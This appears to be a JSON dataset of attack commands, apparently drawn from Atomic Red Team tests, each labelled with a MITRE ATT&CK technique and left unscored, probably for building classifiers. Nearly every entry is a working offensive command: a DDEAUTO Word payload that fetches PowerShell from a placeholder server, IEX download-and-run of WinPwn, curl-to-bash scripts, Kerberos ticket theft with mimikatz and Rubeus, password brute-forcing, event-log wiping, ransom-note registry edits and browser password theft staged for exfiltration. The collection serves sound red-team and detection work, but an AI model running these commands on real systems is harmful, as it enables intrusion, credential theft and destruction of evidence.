        "Command": "1. Open Word\n\n2. Insert tab -> Quick Parts -> Field\n\n3. Choose = (Formula) and click ok.\n\n4. Once the field is inserted, you should now see \"!Unexpected End of Formula\"\n\n5. Right-click the Field, choose \"Toggle Field Codes\"\n\n6. Paste in the code from Unicorn or SensePost\n\n7. Save the Word document.\n\n9. DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"\n\n10. DDEAUTO \"C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\\\v1.0\\\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # \" \"Microsoft Document Security Add-On\"\n",
        "Description": "\nTrustedSec - Unicorn - https://github.com/trustedsec/unicorn\n\nSensePost DDEAUTO - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\n\nWord VBA Macro\n\n[Dragon's Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1559.002",
        "Shell": "manual"
    },
    {
        "ID": 190,
        "Command": "cmstp.exe /s \"PathToAtomicsFolder\\T1218.003\\src\\T1218.003.inf\"\n",
        "Description": "Adversaries may supply CMSTP.exe with INF files infected with malicious commands\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 191,
        "Command": "cmstp.exe /s \"PathToAtomicsFolder\\T1218.003\\src\\T1218.003_uacbypass.inf\" /au\n",
        "Description": "Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 192,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\bin\\x64\\mimikatz.exe\" \"kerberos::ptt \"\n",
        "Description": "Similar to PTH, but attacking Kerberos\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1550.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 193,
        "Command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula \\\\localhost -w c:\\ -c \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgt /user:Administrator /password:Password /domain:$Env:USERDOMAIN /outfile:ticket.kirbi\nSet-Location \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nMove-Item -Force \"\\\\localhost\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host \"Successfully retrieved TGT from 'localhost', now requesting a TGS from local\"\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgs /service:cifs/localhost /ticket:ticket.kirbi /ptt\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\ticket.kirbi\"\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" purge\\t  ",
        "Description": "Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).\nPsExec is used to execute commands on the remote system, and the \"C$\" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1550.003",
        "Shell": "powershell"
    },
    {
        "ID": 194,
        "Command": "echo Password1> passwords.txt\necho 1q2w3e4r>> passwords.txt\necho Password!>> passwords.txt\necho Spring2022>> passwords.txt\necho ChangeMe!>> passwords.txt\n@FOR /F \"delims=\" %p in (passwords.txt) DO @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%username%\" \"%p\" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\\IPC$ > NUL\n",
        "Description": "Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 195,
        "Command": "if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389)\n\n$passwordList = Get-Content -Path \"PathToAtomicsFolder\\T1110.001\\src\\passwords.txt\"\nforeach ($password in $passwordList){\n  $credz = new-object System.Net.NetworkCredential(\"$ENV:USERNAME\", $password, \"$env:UserDnsDomain\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)\n  try {\n\\tWrite-Host \" [-] Attempting ${password} on account $ENV:USERNAME.\"\n\\t$conn.bind()\n\\t# if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n\\tWrite-Host \" [!] $ENV:USERNAME:${password} are valid credentials!\"\n  } catch {\n\\tWrite-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of bruteforce\"\n",
        "Description": "Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.001",
        "Shell": "powershell"
    },
    {
        "ID": 196,
        "Command": "Import-Module -Name AzureAD\n\n$passwords = \"Password1`n1q2w3e4r`nPassword!\".split(\"{`n}\")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\n  try {\n\\tWrite-Host \" [-] Attempting ${password} on account bruce.wayne@contoso.com.\"\n\\tConnect-AzureAD -Credential $Credential 2>&1> $null\n\\t# if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n\\tWrite-Host \" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\"\n\\tbreak\n  } catch {\n\\tWrite-Host \" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of bruteforce\"\n",
        "Description": "Attempt to brute force Azure AD user via AzureAD powershell module.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.001",
        "Shell": "powershell"
    },
    {
        "ID": 197,
        "Command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\\bruteuser.txt TestUser1 \n",
        "Description": "Bruteforce a single user's password from a wordlist\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.001",
        "Shell": "powershell"
    },
    {
        "ID": 198,
        "Command": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art\nsu -c \"cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash\" art\n",
        "Description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.001",
        "Shell": "bash"
    },
    {
        "ID": 199,
        "Command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash\n",
        "Description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.001",
        "Shell": "bash"
    },
    {
        "ID": 200,
        "Command": "pw adduser art -g wheel -s /bin/sh\necho \"password123\" | pw usermod art -h 0\nsu art\ncd /tmp\ncurl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash\n",
        "Description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.001",
        "Shell": "bash"
    },
    {
        "ID": 201,
        "Command": "$lockout_threshold = [int]\"5\"\nfor ($var = 1; $var -le $lockout_threshold; $var++) {\n  PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe -ssh \"atomic.local\" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002\n  }\n",
        "Description": "An adversary may attempt to brute force the password of privilleged account for privilege escalation.\nIn the process, the TA may lock the account, which can be used for detection. [Reference](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/#:~:text=A%20ransomware%20group%20attacking%20large,internal%20systems%20after%20establishing%20a)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.001",
        "Shell": "powershell"
    },
    {
        "ID": 202,
        "Command": "1. Modify a .plist in\n\n\\t/Library/Preferences\n\n\\tOR\n\n\\t~/Library/Preferences\n\n2. Subsequently, follow the steps for adding and running via [Launch Agent](Persistence/Launch_Agent.md)\n",
        "Description": "Modify MacOS plist file in one of two directories\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1647",
        "Shell": "manual"
    },
    {
        "ID": 203,
        "Command": "bcdedit /set safeboot network",
        "Description": "Allows adversaries to abuse safe mode to disable endpoint defenses that may not start with limited boot",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.009",
        "Shell": "command_prompt"
    },
    {
        "ID": 204,
        "Command": "$url = \"https://redcanary.com/wp-content/uploads/Atomic-Red-Team-Logo.png\"\n$imgLocation = \"$env:TEMP\\T1491.001-newWallpaper.png\"\n$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\Control Panel\\Desktop\\' -Name WallPaper).WallPaper\n$orgWallpaper | Out-File -FilePath \"$env:TEMP\\T1491.001-OrginalWallpaperLocation\"\n$updateWallpapercode = @' \nusing System.Runtime.InteropServices; \nnamespace Win32{\n\n\\tpublic class Wallpaper{ \n\\t\\t[DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n\\t\\t static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n\\t\\t \n\\t\\t public static void SetWallpaper(string thePath){ \n\\t\\t\\tSystemParametersInfo(20,0,thePath,3); \n\\t\\t}\n\\t}\n} \n'@\n$wc = New-Object System.Net.WebClient  \ntry{  \n\\t$wc.DownloadFile($url, $imgLocation)\n\\tadd-type $updateWallpapercode \n\\t[Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \ncatch [System.Net.WebException]{  \n\\tWrite-Host(\"Cannot download $url\") \n\\tadd-type $updateWallpapercode \n\\t[Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \nfinally{\\t\n\\t$wc.Dispose()  \n}\n",
        "Description": "Downloads an image from a URL and sets it as the desktop wallpaper.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1491.001",
        "Shell": "powershell"
    },
    {
        "ID": 205,
        "Command": "$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption).LegalNoticeCaption\n$orgLegalNoticeText = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText).LegalNoticeText\n$newLegalNoticeCaption = \"PYSA\"\n$newLegalNoticeText = \"Hi Company, every byte on any types of your devices was encrypted. Don't try to use backups because it were encrypted too. To get all your data contact us:xxxx@onionmail.org\"\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force\\t  ",
        "Description": "Display ransom message to users at system start-up by configuring registry keys HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeCaption and HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeText.\n\n[SynAck Ransomware](https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/synack-ransomware-leverages-process-doppelg-nging-for-evasion-and-infection), \n[Grief Ransomware](https://redcanary.com/blog/grief-ransomware/), \n[Maze Ransomware](https://cyware.com/research-and-analysis/maze-ransomware-a-deadly-combination-of-data-theft-and-encryption-to-target-us-organizations-8f27),\n[Pysa Ransomware](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-destructive-pysa-ransomware),\n[Spook Ransomware](https://community.fortinet.com/t5/FortiEDR/Threat-Coverage-How-FortiEDR-protects-against-Spook-Ransomware/ta-p/204226),\n[DopplePaymer Ransomware](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Dopplepaymer&threatId=-2147221958),\n[Reedemer Ransomware](https://blog.cyble.com/2022/07/20/redeemer-ransomware-back-action/),\n[Kangaroo Ransomware](https://www.bleepingcomputer.com/news/security/the-kangaroo-ransomware-not-only-encrypts-your-data-but-tries-to-lock-you-out-of-windows/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1491.001",
        "Shell": "powershell"
    },
    {
        "ID": 206,
        "Command": "echo \"\" | \"PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe\" -batch \"atomic.local\" -ssh -l root -pw \"password\" \"esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'\"\n",
        "Description": "Changes the ESXi welcome message to potentially display ransom information.\n[Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/esxcli/#change%20display%20information)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1491.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 207,
        "Command": "wevtutil cl System\n",
        "Description": "Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 208,
        "Command": "$logs = Get-EventLog -List | ForEach-Object {$_.Log}\n$logs | ForEach-Object {Clear-EventLog -LogName $_ }\nGet-EventLog -list\n",
        "Description": "Clear event logs using built-in PowerShell commands.\nUpon successful execution, you should see the list of deleted event logs\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.001",
        "Shell": "powershell"
    },
    {
        "ID": 209,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"\n",
        "Description": "This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. \n\nElevation is required for this module to execute properly, otherwise WINWORD will throw an \"Access Denied\" error\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.001",
        "Shell": "powershell"
    },
    {
        "ID": 210,
        "Command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysinternals\\accesschk.exe\" -ArgumentList \"-accepteula .\"\n",
        "Description": "A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from PathToAtomicsFolder\\..\\ExternalPayloads.\n\nSuccessful execution will produce stdout message stating \"Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly\". Upon completion, final output will be a file modification of PathToAtomicsFolder\\..\\ExternalPayloads\\sysinternals\\passwordsdb.\n\nAdapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "powershell"
    },
    {
        "ID": 211,
        "Command": "cd ~/Library/Cookies\ngrep -q \"coinbase\" \"Cookies.binarycookies\"\n",
        "Description": "This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.\n\nUpon successful execution, MacOS shell will cd to `~/Libraries/Cookies` and grep for `Cookies.binarycookies`.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "sh"
    },
    {
        "ID": 212,
        "Command": "\"PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe\" browsers\n",
        "Description": "The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.\nLaZagne is an open source application used to retrieve passwords stored on a local computer. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 213,
        "Command": "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nCopy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n",
        "Description": "Simulates an adversary accessing encrypted credentials from Google Chrome Login database. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "powershell"
    },
    {
        "ID": 214,
        "Command": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n",
        "Description": "Simulates an adversary accessing encrypted credentials from Opera web browser's login database. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "powershell"
    },
    {
        "ID": 215,
        "Command": "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Force -Recurse\n",
        "Description": "Simulates an adversary accessing encrypted credentials from firefox web browser's login database.\nmore info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "powershell"
    },
    {
        "ID": 216,
        "Command": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\\Edge\" -Force -Recurse\n",
        "Description": "Simulates an adversary accessing encrypted credentials from Edge web browser's login database.\nmore info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "powershell"
    },
    {
        "ID": 217,
        "Command": "$PasswordDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\ncmd /c PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1555.004\\Scripts\\python.exe PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1555.004\\Scripts\\Firepwd.py -d $PasswordDBLocation > $env:temp\\T1555.003Test8.txt\ncat $env:temp\\T1555.003Test8.txt\n",
        "Description": "Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.\nUpon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. \n\nWill create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "powershell"
    },
    {
        "ID": 218,
        "Command": "python3 /tmp/LaZagne/Linux/laZagne.py browsers -firefox >> /tmp/firefox_password.txt",
        "Description": "Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "sh"
    },
    {
        "ID": 219,
        "Command": "$exfil_folder = \"$env:temp\\T1555.003\"\nif (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} \ncompress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force\n",
        "Description": "This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,\nsimulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "powershell"
    },
    {
        "ID": 220,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbrowserpwn -consoleoutput -noninteractive",
        "Description": "Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "powershell"
    },
    {
        "ID": 221,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nkittenz -consoleoutput -noninteractive",
        "Description": "Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "powershell"
    },
    {
        "ID": 222,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')\nInvoke-Sharpweb -command \"all\"",
        "Description": "PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "powershell"
    },
    {
        "ID": 223,
        "Command": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data\" \"/tmp/T1555.003_Login Data\"\ncp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data For Account\"\n",
        "Description": "This test locates the Login Data files used by Chrome to store encrypted credentials, then copies them to the temp directory for later exfil. \nOnce the files are exfiltrated, malware like CookieMiner could be used to perform credential extraction. \nSee https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/ . \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "sh"
    },
    {
        "ID": 224,
        "Command": "Start-Process \"PathToAtomicsFolder\\T1555.003\\bin\\WebBrowserPassView.exe\"\nStart-Sleep -Second 4\nStop-Process -Name \"WebBrowserPassView\"\n",
        "Description": "The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "powershell"
    },
    {
        "ID": 225,
        "Command": "$profile = (Gci -filter \"*default-release*\" -path $env:Appdata\\Mozilla\\Firefox\\Profiles\\).FullName\nCopy-Item $profile\\key4.db -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" > $null\nCopy-Item $profile\\logins.json -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" > $null\nRemove-Item $profile\\key4.db > $null\nRemove-Item $profile\\logins.json > $null\nCopy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\key4.db\" -Destination $profile\\ > $null\nCopy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\logins.json\" -Destination $profile\\ > $null\ncd \"$env:PathToAtomicsFolder\\T1555.003\\bin\"\n\"\"|.\\BrowserCollector.exe\n",
        "Description": "[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.\nIf using to test with Firefox, if the browser is x64 you need to use the x64 build\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "powershell"
    },
    {
        "ID": 226,
        "Command": "esentutl.exe /y \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" /d \"%temp%\\T1555.003_Login_Data.tmp\"\n",
        "Description": "This test simulates an adversary using esentutl to dump encrypted credentials from Google Chrome's Login database.\n[Reference](https://actzero.ai/resources/blog/hygiene-tip-shut-down-attackers-harvesting-cached-browser-credentials/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 227,
        "Command": "Set-ExecutionPolicy -Scope Process Bypass -Force\n$owners = @{}\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}\nGet-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}\n& \"$PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1\"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")\n",
        "Description": "This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1134.002",
        "Shell": "powershell"
    },
    {
        "ID": 228,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem",
        "Description": "Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1134.002",
        "Shell": "powershell"
    },
    {
        "ID": 229,
        "Command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"\nInvoke-EnumerateAzureBlobs -base secure -permutations \"PathToAtomicsFolder\\..\\ExternalPayloads\\permutations.txt\" -outputfile \"$env:temp\\T1530Test1.txt\"\n",
